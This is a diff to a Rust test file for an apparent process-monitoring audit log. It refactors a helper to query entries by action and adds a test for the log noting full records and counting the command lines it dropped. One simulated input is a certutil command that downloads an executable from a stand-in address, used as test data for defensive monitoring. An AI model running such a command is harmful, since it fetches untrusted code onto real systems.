@@ -182,12 +182,16 @@ impl Lab {
 
     /// The details of each process start the audit log holds, oldest first.
     async fn audited(&self) -> Vec<Value> {
+        self.entries(AuditAction::TreeProcessStarted).await
+    }
+
+    /// The details of each entry of `action` the audit log holds, oldest first.
+    async fn entries(&self, action: AuditAction) -> Vec<Value> {
         self.db
-            .read(|conn| {
-                let mut statement = conn.prepare(
-                    "SELECT details FROM audit_log WHERE action = 'tree_process_started' ORDER BY id",
-                )?;
-                let rows = statement.query_map([], |row| row.get::<_, String>(0))?;
+            .read(move |conn| {
+                let mut statement =
+                    conn.prepare("SELECT details FROM audit_log WHERE action = ?1 ORDER BY id")?;
+                let rows = statement.query_map([action.as_str()], |row| row.get::<_, String>(0))?;
                 Ok::<_, observer_store::StoreError>(
                     rows.map(|row| serde_json::from_str(&row.unwrap()).unwrap())
                         .collect::<Vec<Value>>(),
@@ -616,6 +620,46 @@ async fn a_program_s_row_runs_until_the_last_of_its_instances_ends() {
     lab.advance(1);
     lab.ended(1, 4120).await;
     assert_eq!(lab.processes().await[0].ended_at, Some(lab.clock.now()));
+}
+
+#[tokio::test]
+async fn a_run_past_its_records_says_so_at_once_and_counts_the_command_lines_it_did_not_keep() {
+    let mut lab = lab().await;
+    lab.spawn(1).await;
+    let cmd = r"C:\Windows\System32\cmd.exe";
+    for index in 0..1200 {
+        lab.start(
+            1,
+            5000 + index,
+            cmd,
+            &format!("cmd /c echo {index}"),
+            ProcessKind::Shell,
+        )
+        .await;
+    }
+    assert!(
+        lab.entries(AuditAction::TreeRecordsFull).await.is_empty(),
+        "200 rows and 1,000 entries keep them all"
+    );
+
+    let payload = "cmd /c certutil -urlcache -f http://203.0.113.5/p.exe p.exe";
+    lab.start(1, 7000, cmd, payload, ProcessKind::Shell).await;
+    lab.start(1, 7001, cmd, "cmd /c echo bye", ProcessKind::Shell)
+        .await;
+
+    assert_eq!(
+        lab.entries(AuditAction::TreeRecordsFull).await,
+        [json!({ "generation": 1 })]
+    );
+    assert!(lab.notes().contains(&records_full_note()), "{:?}", lab.notes());
+    lab.exit(1, Some(0), None).await;
+    assert_eq!(
+        lab.entries(AuditAction::TreeRecordsFull).await,
+        [
+            json!({ "generation": 1 }),
+            json!({ "generation": 1, "unrecorded": 2 })
+        ]
+    );
 }
 
 #[tokio::test]
